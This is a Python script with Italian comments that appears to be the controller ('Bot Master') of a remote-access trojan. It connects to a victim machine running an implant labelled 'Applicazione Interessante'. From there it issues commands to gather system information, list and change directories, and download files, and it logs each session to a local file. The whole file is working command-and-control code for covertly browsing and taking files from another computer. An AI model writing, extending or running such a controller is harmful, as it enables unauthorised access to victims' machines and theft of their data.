from audioop import add
from socket import *
from functions import *
from datetime import datetime

serverName = input("IP: ")
serverPort = 12000
clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName,serverPort))
#Genera un report della sessione
report = open("./Log.txt","a")
ct = datetime.now().strftime("%d-%m-%Y")
report.write(ct + "\n")
ct = datetime.now().strftime("%H:%M:%S")
report.write("[" + ct + "] Connesso\n")
print("Connesso\n")
while True:
    com = input ("\nInserire un comando (\"help\" per la lista dei comandi): ")
    comando = "x"
    if com == "system":
        comando = "1"
        ct = datetime.now().strftime("%H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" " + com + "\n")
    elif com == "ls":
        comando = "2"
        ct = datetime.now().strftime("%H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" ls\n")
    #Cambia directory inserendo la directory destinazione dopo cd (cd directory)
    elif com[0:3] == "cd ":
        comando = "3" + com[2:]
        ct = datetime.now().strftime("%H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" " + com + "\n")
    #Visualizza la current working directory
    elif com == "pwd":
        comando = "4"
        ct = datetime.now().strftime("%H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" pwd\n")
    #Legge un file presente nella working directory
    elif com[0:9] == "download ":
        file = com[9:]
        comando = "5" + file
        ct = datetime.now().strftime("%H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" " + com + "\n")
    #Visualizza la lista dei comandi
    elif com == "help":
        cmd_list()
        continue
    #Chiude la connessione
    elif com == "exit":
        comando = "exit"
        ct = datetime.now().strftime("%H:%M:%S")
        report.write("[" + ct + "] \"Bot Master\" exit\n")
    else:
        print("Comando non riconosciuto\n")
        continue
    clientSocket.send(comando.encode())
    if comando == "exit":
        print ("Connessione terminata")
        ct = datetime.now().strftime("%H:%M:%S")
        report.write("[" + ct + "] Disconnesso\n\n")
        report.close()
        break
    if com[0:9] == "download ":
        file = ""
        file = clientSocket.recv(104857600)
        download_file(file,com[9:])        
        ct = datetime.now().strftime("%H:%M:%S")
        report.write("[" + ct + "] downloaded " + com[9:] + "\n")
    else:
        messaggio = clientSocket.recv(102400).decode()
        print ("\n" + messaggio + "\n")
        ct = datetime.now().strftime("%H:%M:%S")
        report.write("[" + ct + "] \"Applicazione Interessante\"\n" + messaggio + "\n")
clientSocket.close()